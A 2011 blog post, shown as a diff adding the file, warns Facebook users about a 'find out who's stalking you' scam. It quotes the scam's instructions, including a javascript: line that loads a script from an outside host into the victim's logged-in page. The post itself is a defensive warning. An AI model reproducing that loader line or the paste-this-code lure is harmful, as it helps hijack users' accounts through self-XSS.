@@ -1,0 +1,45 @@
+---
+layout: post
+title: You can find out who's SCAMMING you on Facebook!
+date: 2011-04-16 15:28:12.000000000 -04:00
+categories:
+- Tech
+tags: []
+status: publish
+type: post
+published: true
+meta:
+  _edit_last: '1'
+  dsq_thread_id: '280983471'
+  _wp_old_slug: you-can-find-out-who's-scamming-you-on-facebook!
+  tc-thumb-fld: a:2:{s:9:"_thumb_id";b:0;s:11:"_thumb_type";s:10:"attachment";}
+author:
+  login: Tom
+  email: tom.w.elliott@gmail.com
+  display_name: Tom
+  first_name: ''
+  last_name: ''
+excerpt: !ruby/object:Hpricot::Docoptions: {}
+
+---
+<p><strong><img style="float: right; width: 250px; height: 164px; margin: 5px;" src="/assets/fbprofile.png" alt="" />If you're a Facebook user (and you don't even have to be as addicted as I), you've probably been bombarded over the last few weeks by invites, messages and wall posts inviting you to "Find out who's been stalking you". And yes, they're scams.</strong></p>
+<p>I got an event invitation the other day with just that sort of heading, with the word "stalking" in HUGE CAPITALS to cater to the Daily Mail righteous indignation crowd (I'm yet to see any "find the SEX OFFENDERS in your area for violent retribution" scams). The text of the invite was as follows:</p>
+<pre>yo , I discovered a way to view who views your account
+
+Follow these super easy steps to find out:
+
+1. Copy this code:
+
+javascript:(a=(b=document).createElement('script')).src='//rty.fbglitch-b.info/e.js',b.body.appendChild(a);void(0)
+
+2. Paste it in your URL address bar and click enter/return.
+
+Note: The URL adress bar is the white bar where you type your websites.
+
+3. Wait for the {{Trick||Glitch||Spoof}} to process and then check your account!</pre>
+<p>Before I say anything else: If you see this, <strong>don't do what it says</strong>.</p>
+<p><!--more-->My main clue that this probably wasn't a genuine message was that the guy who sent it would never use the word, "yo". The second clue was that this was asking me to <em>paste code into my address bar</em>, and that code contained a url of a site with a strangely artificial looking name (the erstwhile <em>rty.fbglitch-b.info</em>).</p>
+<p>Downloading the javascript in question revealed a heavily obfuscated segment of code, someone clearly trying to hide what they were doing. From the way I received the invite, I'm guessing it would create a similar event and invite everyone off your contacts list (probably through AJAX requests on the current Facebook page), and likely force a few clicks on an advert or two along the way.</p>
+<p>Pasting JavaScript into the address bar can have it's uses, although the only ones that spring to mind are handy bookmarks for "like this page" and such. Being able to embed a script from a completely different domain and insert it into the current page willy-nilly seems like a crazy hole to me. I don't know a whole lot about JavaScript engines, but does anyone know if there are checks against code inserted via the address bar? If not, there darn well should be.</p>
+<p>I suppose my main warning would be, if you're given some code to run, and you can't see what it does from reading it. <strong>Don't run it!</strong> This particular attack was just annoying spam facilitation. But what if you ran something like this in your webmail and it sent all your private stuff to a phisher somewhere in Nigeria. Ever e-mailed yourself a password? An account number?</p>
+<p>Granted, not many people know enough JavaScript to validate everything that comes their way. But all the better. Don't run anything! Never take sweets from strangers! Demand a genuine video cassette from your stockist!</p>
